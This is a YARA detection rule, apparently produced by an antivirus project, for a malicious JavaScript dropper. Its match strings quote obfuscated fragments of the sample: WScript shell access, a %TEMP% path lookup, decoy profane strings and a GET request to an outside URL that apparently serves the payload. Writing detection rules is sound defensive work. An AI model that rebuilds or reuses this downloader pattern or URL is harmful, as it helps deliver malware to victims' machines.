rule sig_20160428_92ace1cfb7f3c61d47616f6f4d366a6e {
  meta:
    description = "datamaliciousorder - file 20160428_92ace1cfb7f3c61d47616f6f4d366a6e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "27b94685a480e19e6f73834c121c00e1995d0cca0d067283aa64d217faff8ca3"

  strings:
    $s1  = "function BxaTasRwqTayBxuUcjGgd(GrxMovLvuPfxBugDjoEol){SwnTehGfxMbgGwxFooKwo[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function YkaNptUfoUyyJquNydLhq() {return SwnTehGfxMbgGwxFooKwo[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function BxaTasRwqTayBxuUcjGgd(GrxMovLvuPfxBugDjoEol){SwnTehGfxMbgGwxFooKwo[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return KxkAftAjjErhSpfMagJof - XaaFfmZxtUjkCyhUspIto;};" fullword ascii
    $s5  = "function QhqZtgJxkCnbTwmAfcZfs(KxkAftAjjErhSpfMagJof, XaaFfmZxtUjkCyhUspIto){OmqJhpDmvNelGkeLguEvc = OmqJhpDmvNelGkeLguEvc * 1; " ascii
    $s6  = "var SwnTehGfxMbgGwxFooKwo = function IcwBzrSqyUfiEzcZkgGxt() {return LokOhbHedUunLkuTtaGaj[BhlPxhKutQkzRtnKwhOuo](\"WScript\"+\"" ascii
    $s7  = "QigBvmHohZxrPxgLkePxt[AyjTubUelCmyYwtAweNhi](\"G\" + \"ET\", \"http://test.barbasov.ru/z0olqa\", false);" fullword ascii
    $s8  = "var LokOhbHedUunLkuTtaGaj = this[\"WScript\"];" fullword ascii
    $s9  = "var SwnTehGfxMbgGwxFooKwo = function IcwBzrSqyUfiEzcZkgGxt() {return LokOhbHedUunLkuTtaGaj[BhlPxhKutQkzRtnKwhOuo](\"WScript\"+\"" ascii
    $s10 = "function YkaNptUfoUyyJquNydLhq() {return SwnTehGfxMbgGwxFooKwo[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function QhqZtgJxkCnbTwmAfcZfs(KxkAftAjjErhSpfMagJof, XaaFfmZxtUjkCyhUspIto){OmqJhpDmvNelGkeLguEvc = OmqJhpDmvNelGkeLguEvc * 1; " ascii
    $s12 = "function WpsEkcIwkEfsOynJtlDdp(){return RjzUszSfzOkqTccCsgZod + \"\";};" fullword ascii
    $s13 = "if (QigBvmHohZxrPxgLkePxt[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function LieTznBahFmrZgePvwDju() {return ((BelDbxFzeLgkQezGvxJms == true) && (BelDbxFzeLgkQezGvxJms == WhjJxvIcyKhvGukIfkFja)) ?" ascii
    $s15 = "function LieTznBahFmrZgePvwDju() {return ((BelDbxFzeLgkQezGvxJms == true) && (BelDbxFzeLgkQezGvxJms == WhjJxvIcyKhvGukIfkFja)) ?" ascii
    $s16 = "function HstPhlTgkJakHzqMuzShv(){return 23;};" fullword ascii
    $s17 = "function FgzEnfPmbSkhNqgZvuDhs()" fullword ascii
    $s18 = "function GryVhkBwiJnkFmbPzzVhk(PtgAhqVgiNeqFxvNgbZuu) {var SofWjbZkqWasAqmYuhWwv = (1, 2, 3, 4, 5, PtgAhqVgiNeqFxvNgbZuu); retur" ascii
    $s19 = "var RbxMlcQfxSpqIbtHqhOwc = false;" fullword ascii
    $s20 = "function GryVhkBwiJnkFmbPzzVhk(PtgAhqVgiNeqFxvNgbZuu) {var SofWjbZkqWasAqmYuhWwv = (1, 2, 3, 4, 5, PtgAhqVgiNeqFxvNgbZuu); retur" ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}